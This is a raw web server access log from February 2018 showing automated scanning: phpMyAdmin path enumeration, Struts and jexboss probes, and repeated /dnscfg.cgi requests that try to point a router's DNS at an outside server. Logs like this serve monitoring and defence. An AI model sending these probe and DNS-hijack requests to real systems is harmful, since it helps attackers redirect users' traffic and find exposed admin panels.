203.196.165.218 - - [16/Feb/2018:06:51:08 -0500] "GET /phpmyadmin2/index.php HTTP/1.0" 404 219 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:08 -0500] "GET /myadmin/index.php HTTP/1.0" 404 215 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:08 -0500] "GET /myadmin2/index.php HTTP/1.0" 404 216 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:09 -0500] "GET /xampp/phpmyadmin/index.php HTTP/1.0" 404 224 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:09 -0500] "GET /phpMyadmin_bak/index.php HTTP/1.0" 404 222 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:10 -0500] "GET /www/phpMyAdmin/index.php HTTP/1.0" 404 222 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:10 -0500] "GET /tools/phpMyAdmin/index.php HTTP/1.0" 404 224 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:11 -0500] "GET /phpmyadmin-old/index.php HTTP/1.0" 404 222 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:11 -0500] "GET /pma-old/index.php HTTP/1.0" 404 215 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:11 -0500] "GET /claroline/phpMyAdmin/index.php HTTP/1.0" 404 228 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:12 -0500] "GET /typo3/phpmyadmin/index.php HTTP/1.0" 404 224 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:12 -0500] "GET /phpma/index.php HTTP/1.0" 404 213 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:13 -0500] "GET /phpmyadmin/phpmyadmin/index.php HTTP/1.0" 404 229 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:13 -0500] "GET /phpMyAdmin/phpMyAdmin/index.php HTTP/1.0" 404 229 "-" "Mozilla/5.0"
35.196.211.201 - - [16/Feb/2018:10:40:54 -0500] "GET /dnscfg.cgi?dnsPrimary=192.95.1.54&dnsSecondary8.8.8.8&dnsDynamic=0&dnsRefresh=1 HTTP/1.1" 404 208 "-" "curl/7.52.1"
35.196.211.201 - brute [16/Feb/2018:10:40:54 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0"
35.195.14.212 - - [16/Feb/2018:10:48:54 -0500] "GET /dnscfg.cgi?dnsPrimary=192.95.1.54&dnsSecondary8.8.8.8&dnsDynamic=0&dnsRefresh=1 HTTP/1.1" 404 208 "-" "curl/7.52.1"
35.195.14.212 - brute [16/Feb/2018:10:48:54 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0"
35.184.250.167 - - [16/Feb/2018:11:34:48 -0500] "GET /dnscfg.cgi?dnsPrimary=192.95.1.54&dnsSecondary8.8.8.8&dnsDynamic=0&dnsRefresh=1 HTTP/1.1" 404 208 "-" "curl/7.52.1"
35.184.250.167 - brute [16/Feb/2018:11:34:48 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0"
185.130.212.79 - - [16/Feb/2018:16:24:28 -0500] "GET / HTTP/1.1" 200 2321 "-" "-"
123.207.119.252 - - [16/Feb/2018:17:23:59 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
123.207.119.252 - - [16/Feb/2018:17:24:00 -0500] "GET /login.action HTTP/1.1" 404 210 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
123.207.119.252 - - [16/Feb/2018:17:24:00 -0500] "GET /index.action HTTP/1.1" 404 210 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
123.207.119.252 - - [16/Feb/2018:17:24:01 -0500] "GET /index.htm HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
123.207.119.252 - - [16/Feb/2018:17:24:01 -0500] "GET /index.html HTTP/1.1" 404 208 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
123.207.119.252 - - [16/Feb/2018:17:24:02 -0500] "GET /index.jsp HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
104.154.118.56 - - [16/Feb/2018:20:31:48 -0500] "GET /dnscfg.cgi?dnsPrimary=192.95.1.54&dnsSecondary8.8.8.8&dnsDynamic=0&dnsRefresh=1 HTTP/1.1" 404 208 "-" "curl/7.52.1"
104.154.118.56 - brute [16/Feb/2018:20:31:48 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0"
172.104.108.109 - - [16/Feb/2018:22:56:32 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0"
47.93.123.45 - - [16/Feb/2018:23:00:59 -0500] "GET / HTTP/1.0" 200 2321 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
47.93.123.45 - - [16/Feb/2018:23:01:00 -0500] "HEAD / HTTP/1.0" 200 - "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
47.93.123.45 - - [16/Feb/2018:23:01:05 -0500] "GET /github.com/joaomatosf/jexboss HTTP/1.0" 404 227 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
